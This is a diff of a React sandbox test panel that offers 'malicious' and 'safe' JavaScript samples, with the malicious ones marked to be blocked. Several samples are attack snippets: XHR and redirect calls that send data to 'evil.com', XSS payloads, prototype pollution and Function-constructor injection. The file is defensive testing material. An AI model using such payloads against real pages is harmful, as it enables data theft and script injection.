@@ -1,4 +1,4 @@
-import { useState } from 'react';
+import { memo, useCallback, useMemo, useState } from 'react';
 import './SecurityTestPanel.css';
 
 const MALICIOUS_EXAMPLES = [
@@ -9,17 +9,19 @@ const MALICIOUS_EXAMPLES = [
   },
   {
     name: 'Function Constructor',
-    code: `const fn = new Function('console.log("Code injection")');\nfn();`,
+    code: `const fn = new Function('console.log("Code injection")');
+fn();`,
     description: 'Function constructor - should be blocked'
   },
   {
     name: 'Window Access',
-    code: `window.location = 'http://evil.com/steal';\nconsole.log('Redirected');`,
+    code: `window.location = 'http://evil.com/steal';
+console.log('Redirected');`,
     description: 'Window manipulation - should be blocked'
   },
   {
     name: 'Document Access',
-    code: `document.body.innerHTML = '<script>alert("XSS")</script>';`,
+    code: `document.body.innerHTML = '<script>alert("XSS")<\/script>';`,
     description: 'DOM manipulation - should be blocked'
   },
   {
@@ -29,32 +31,42 @@ const MALICIOUS_EXAMPLES = [
   },
   {
     name: 'LocalStorage Theft',
-    code: `localStorage.setItem('stolen', 'sensitive data');\nconsole.log(localStorage.getItem('stolen'));`,
+    code: `localStorage.setItem('stolen', 'sensitive data');
+console.log(localStorage.getItem('stolen'));`,
     description: 'Storage access - should be blocked'
   },
   {
     name: 'Prototype Pollution',
-    code: `const obj = {};\nobj.__proto__.isAdmin = true;\nconsole.log('Prototype polluted');`,
+    code: `const obj = {};
+obj.__proto__.isAdmin = true;
+console.log('Prototype polluted');`,
     description: 'Prototype manipulation - should be blocked'
   },
   {
     name: 'InnerHTML XSS',
-    code: `const div = { innerHTML: '' };\ndiv.innerHTML = '<img src=x onerror=alert("XSS")>';`,
+    code: `const div = { innerHTML: '' };
+div.innerHTML = '<img src=x onerror=alert("XSS")>';`,
     description: 'XSS via innerHTML - should be blocked'
   },
   {
     name: 'XMLHttpRequest',
-    code: `const xhr = new XMLHttpRequest();\nxhr.open('POST', 'http://evil.com');\nxhr.send('data');`,
+    code: `const xhr = new XMLHttpRequest();
+xhr.open('POST', 'http://evil.com');
+xhr.send('data');`,
     description: 'XHR request - should be blocked'
   },
   {
     name: 'Infinite Loop',
-    code: `while(true) {\n  console.log('Infinite loop');\n}`,
+    code: `while(true) {
+  console.log('Infinite loop');
+}`,
     description: 'Should timeout after 5 seconds'
   },
   {
     name: 'Base64 Obfuscation',
-    code: `const encoded = btoa('malicious');\nconst decoded = atob(encoded);\nconsole.log(decoded);`,
+    code: `const encoded = btoa('malicious');
+const decoded = atob(encoded);
+console.log(decoded);`,
     description: 'Obfuscation attempt - should be blocked'
   },
   {
@@ -67,32 +79,38 @@ const MALICIOUS_EXAMPLES = [
 const SAFE_EXAMPLES = [
   {
     name: 'Simple Math',
-    code: `console.log(2 + 2);\nconsole.log(Math.sqrt(16));`,
+    code: `console.log(2 + 2);
+console.log(Math.sqrt(16));`,
     description: 'Safe math operations - should work'
   },
   {
     name: 'String Operations',
-    code: `const name = 'World';\nconsole.log('Hello, ' + name + '!');`,
+    code: `const name = 'World';
+console.log('Hello, ' + name + '!');`,
     description: 'Safe string operations - should work'
   },
   {
     name: 'Array Operations',
-    code: `const arr = [1, 2, 3];\nconsole.log(arr.map(x => x * 2));`,
+    code: `const arr = [1, 2, 3];
+console.log(arr.map(x => x * 2));`,
     description: 'Safe array operations - should work'
   },
   {
     name: 'Object Operations',
-    code: `const obj = { a: 1, b: 2 };\nconsole.log(Object.keys(obj));`,
+    code: `const obj = { a: 1, b: 2 };
+console.log(Object.keys(obj));`,
     description: 'Safe object operations - should work'
   },
   {
     name: 'Date Operations',
-    code: `const now = new Date();\nconsole.log(now.toISOString());`,
+    code: `const now = new Date();
+console.log(now.toISOString());`,
     description: 'Safe date operations - should work'
   },
   {
     name: 'JSON Operations',
-    code: `const data = { name: 'test', value: 123 };\nconsole.log(JSON.stringify(data));`,
+    code: `const data = { name: 'test', value: 123 };
+console.log(JSON.stringify(data));`,
     description: 'Safe JSON operations - should work'
   }
 ];
@@ -101,37 +119,44 @@ function SecurityTestPanel({ onLoadCode }) {
   const [activeTab, setActiveTab] = useState('malicious');
   const [selectedExample, setSelectedExample] = useState(null);
 
-  const examples = activeTab === 'malicious' ? MALICIOUS_EXAMPLES : SAFE_EXAMPLES;
+  const examples = useMemo(
+    () => (activeTab === 'malicious' ? MALICIOUS_EXAMPLES : SAFE_EXAMPLES),
+    [activeTab]
+  );
 
-  const handleLoadExample = (example) => {
+  const handleLoadExample = useCallback((example) => {
     onLoadCode(example.code);
     setSelectedExample(example.name);
-  };
+  }, [onLoadCode]);
+
+  const handleSelectTab = useCallback((tab) => {
+    setActiveTab(tab);
+  }, []);
 
   return (
     <div className="security-test-panel">
       <div className="test-panel-header">
-        <h3>🧪 Security Test Examples</h3>
+        <h3>Security Test Examples</h3>
         <div className="test-tabs">
           <button
             className={activeTab === 'malicious' ? 'active' : ''}
-            onClick={() => setActiveTab('malicious')}
+            onClick={() => handleSelectTab('malicious')}
           >
-            ⚠️ Malicious (Should Block)
+            Malicious (Should Block)
           </button>
           <button
             className={activeTab === 'safe' ? 'active' : ''}
-            onClick={() => setActiveTab('safe')}
+            onClick={() => handleSelectTab('safe')}
           >
-            ✅ Safe (Should Work)
+            Safe (Should Work)
           </button>
         </div>
       </div>
       
       <div className="test-examples">
-        {examples.map((example, index) => (
+        {examples.map((example) => (
           <div
-            key={index}
+            key={example.name}
             className={`test-example ${selectedExample === example.name ? 'selected' : ''}`}
           >
             <div className="example-header">
@@ -152,5 +177,4 @@ function SecurityTestPanel({ onLoadCode }) {
   );
 }
 
-export default SecurityTestPanel;
-
+export default memo(SecurityTestPanel);
